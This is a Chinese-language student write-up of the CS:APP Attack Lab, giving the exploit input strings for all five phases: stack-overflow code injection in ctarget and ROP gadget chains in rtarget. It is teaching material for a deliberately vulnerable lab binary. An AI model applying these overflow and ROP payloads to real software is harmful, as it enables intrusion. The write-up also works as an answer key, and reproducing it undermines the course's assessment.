# Attack lab 实验解析

## 文件内容

本次实验需要好好看官网的 writeup，里面有很详细的介绍和提示

首先本次实验分为两个部分

- 利用栈溢出注入代码进行攻击
- 利用 gadgets，消除栈不可执行和栈地址随机化的保护实现代码攻击

对于两种攻击方式先进行简单解释：

c语言对于数组的引用没有相应的越界检查，而且局部变量和状态信息（例如保存的寄存器的值，以及函数调用后的下一步执行的指令地址）保存在栈中，所以当数组越界以后，对于原先栈中的保存信息进行写操作时，就会导致代码的执行逻辑收到攻击，发生没有预想的变化。



实验有几个文件：

- hex2raw 将 16 进制的顺序字符转化为 gets() 输入的字符串，实现对于缓冲区的显式写入

- farm.c 可以在这里找到这种所需要的 gadgets
- ctarget 第一部分实验的可执行文件
- rtarget 第二部分实验的可执行文件

## 实验部分一

根据汇编可以得到如下的地址信息：

> touch1 首地址 0x4017c0
>
> touch2 首地址 0x4017ec
>
> touch3 首地址 0x4018fa
>
> cookie 0x59b997fa
>
> 分配buffer后的栈顶指针地址 0x5561dc78
>
> 分配buffer前的栈顶指针地址 0x5561dca8

### phase1

首先了解到 ctarget 会调用 test 方法，在 test 方法中调用 getBuf，查看 getBuf 的汇编可以知道



对于栈指针的下移 40 个字节，只需要输入 48 个字节，后 8 个字节就是函数调用后，下一步要执行的指令的地址，所以将 touch1 函数的指令首地址写入，那么当 getBuf 调用完了以后，程序会去执行 touch1 方法， 实验完成

所以栈中应该呈现的数据形式：

> 00 00 00 00 00 00 00 00 00 00
> 00 00 00 00 00 00 00 00 00 00
> 00 00 00 00 00 00 00 00 00 00
> 00 00 00 00 00 00 00 00 00 00
> c0 17 40 00

### phase2

这里对于 phase1 来说，只是多了一个穿参数的操作，我们理想的调用情况应该是，字符输入完以后，函数跳转至执行 参数传入，然后再调用 touch2，由于栈是可执行的，所以我们可以将 getbuf执行后的返回地址 重写成栈的地址，然后通过栈中我们注入的编码好的指令进行传参，最后跳转至 touch2.

注意到 touch2 中要求传入的参数的值为 cookie，且下一步应该是调用 touch2 所以应该要执行的指令为：

```s
movq	$0x59b997fa,%rdi
pushq	$0x004017ec
retq
```



转化为二进制：

```
48 c7 c7 fa 97 b9 59 	/* mov    $0x59b997fa,%rdi */
68 ec 17 40 00       	/* pushq  $0x4017ec */
c3                   	/* retq */
```



可以将传参的指令写到栈顶，然后在 40 个字节后面重写写入栈顶地址，这样就可以达到整个调用链的状态

所以可以将输入的字符串整理为：

> 48 c7 c7 fa 97 b9 59    */\* mov    $0x59b997fa,%rdi \*/*
>
> 68 ec 17 40 00          */\* pushq  $0x4017ec \*/*
>
> c3                      */\* retq \*/*
>
> 00 00 00
>
> 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00 00 00
>
> 78 dc 61 55 00 00 00 00

### phase3

本题和 phase3 差不多，只不过将传入的参数换成了一个字符串，也就是一个 char * 指针，同时可以调试的时候可以看到 40 个字节其实不太安全，后面会覆盖掉传入的参数，那么可以将 字符串的写入换到 test 返回地址后面，其他情况和 phase2 类似，所以答案可以如下所示：

> 48 c7 c7 a8 dc 61 55    */\* mov    $0x5561dca8,%rdi \*/*
>
> 68 fa 18 40 00  */\* pushq  $0x4018fa \*/*
>
> c3                      */\* retq \*/*
>
> 00 00 00
>
> 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00 00 00
>
> 78 dc 61 55 00 00 00 00   
>
> 35 39 62 39 39 37 66 61 00

## 实验部分二

### phase4

要求用 ROP 攻击方法实现 phase2 的效果

因此输入的字符串应该先填充 40 字节 然后修改更高字节的栈地址为不同的 gadgets 实现想要的操作，因为要实现的效果单纯就是去 farm 的反汇编去找对应的指令，感觉和前面两个没什么区别，只需要在代码区找到前面我们手写的 汇编语言就好（当然一些数据要通过栈存取），所以就没有专门去找，直接参考了别人找到的地址操作就可以，答案：

> 00 00 00 00 00 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00 00 00
>
> 00 00 00 00 00 00 00 00 00 00
>
> ab 19 40 00 00 00 00 00
>
> fa 97 b9 59 00 00 00 00
>
> a2 19 40 00 00 00 00 00
>
> ec 17 40 00 00 00 00 00

### phase5

这道题的实现效果和 phase3 一样，慢慢找并且断点调试栈指针的位置和值，就可以得到最后的答案，其实还是挺难的，我找了很久，实在不耐烦，就去看了被人的解析，最后也算明白了答案，贴一下最后的结果：

> 51 51 51 51 51 51 51 51 51 51
> 51 51 51 51 51 51 51 51 51 51
> 51 51 51 51 51 51 51 51 51 51
> 51 51 51 51 51 51 51 51 51 51
> ad 1a 40 00 00 00 00 00
> d8 19 40 00 00 00 00 00
> a2 19 40 00 00 00 00 00
> fa 18 40 00 00 00 00 00
> 31 31 31 31 31 31 31 31 31 31
> 31 31 31 31 31 31 31 31 31 31
> 31 31 31 31 31 31 31 31 31 31
> 31
> 35 39 62 39 39 37 66 61 00



## 小结

总的来说比 bomb 还是要简单不少的，基本的思路都有，实现方式也不算复杂，就是第一部分中，其实是可以把跳转的执行地址放到栈里的，我们就可以把自己写的代码通过字符注入栈中，通过溢出的栈修改跳转位置，跳转到我们的输入的地址，然后程序就会按照我们写的去跑。第二部分，由于栈是不可执行的，利用retq 的特性，可以通过已经在代码区编好的指令去实现我们想要的结果，但是比较难匹配 gadgets